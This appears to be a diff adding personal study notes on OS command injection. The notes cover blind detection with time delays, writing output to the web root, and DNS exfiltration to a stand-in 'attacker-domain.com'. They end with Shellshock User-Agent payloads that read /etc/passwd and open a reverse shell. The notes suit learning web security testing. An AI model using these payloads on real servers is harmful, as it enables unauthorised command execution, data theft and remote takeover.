@@ -1,0 +1,108 @@
+-------------------------------------------------------+
+-------------------------------------------------------+
+OS command injection
+-------------------------------------------------------+
+-------------------------------------------------------+
+
+~ allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application
+~ cab be used to compromise other parts of the hosting infrastructure
+
+eg 
+https://insecure-website.com/stockStatus?productID=381&storeID=29  ===> checks the stock in backend using command
+stockreport.pl 381 29 ===> where 381 and 29 are user supplied and directly used by the system without sanitizing
+
+then an attacker can enter their own command in place of the ID eg productID=381|whoami&storeID=29 ===> this might generate and error about the invalid productID but will still return the output of whoami command
+
+
+-------------------------------------------------------+
+Blind OS command injection
+-------------------------------------------------------+
+~ does not return the output from the command within its HTTP response but they can still be exploited
+
+~ You can use acommand that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond.
+
+~ the ping command is an effective way to detect blind os injection: 
+
+ping -c 10 127.0.0.1    ===> which will wait 10 seconds before responding
+
+or ping+-c+10+127.0.0.1    ===> since + is interpreted as space
+
+or ||ping+-c+10+127.0.0.1||   ===>which will concatenate the parameter before it and after it, ensuring that other parameters are not affected by out injection and thus can be executed normally
+
+%26ls||id%26
+&ls||id&
+
+~once you know that your commands are being executed , yo are further exploit by redirecting the output and then retrieving it
+
+~ if the site is storing its files in /var/www/folder1 then you can save the payload output there 
+eg ||echo $(whoami) > var/www/folder1/who.txt||    --->  which will save the file in that location, you can then easily access the file through teh browser  :  https://insecure-site/who.txt
+or retrieve it as a file eg   --->   <img src="/var/www/images/who.txt" >
+
+
+-------------------------------------------------------+
+blind OS command injection using out-of-band (OAST) 
+-------------------------------------------------------+
+
+~ You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques (use burp collaborator)
+
+eg   --->   ||nslookup attacker-domain.com||
+
+
+You can use this same technique to exfiltrate data and send it the form of a DNS request to your domain
+
+eg    --->   ||nslookup `whoami`.attacker-domain.com||
+which will return hostname.attacker-domain.com
+
+
+
+-------------------------------------------------------+
+Ways of injecting OS commands
+-------------------------------------------------------+
+
+~ A number of characters function as command separators, allowing commands to be chained together
+~ different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations
+~ Sometimes, the input that you control appears within quotation marks , you need to terminate the quoted context (using " or ') before using suitable shell metacharacters
+
+    &
+    &&
+    |
+    ||
+
+
+for unix based only 
+
+
+    ;
+    Newline (0x0a or \n)
+
+
+On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command
+
+
+    ` injected command `
+    $( injected command )
+
+In User-Agent Enter below payload
+/cgi-bin/jarrewrite.sh
+() { ;: }; echo ; /bin/bash -c "cat /etc/passwd"
+() { ;: }; echo ; /bin/bash -c "whoami"
+()+{+%3b%3a+}%3b+echo+%3b+/bin/bash+-c+"whoami"
+() { ;: }; echo ; /bin/bash -c "nohup bash -i >& /dev/tcp/your_server/port_number 0>&1 &"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
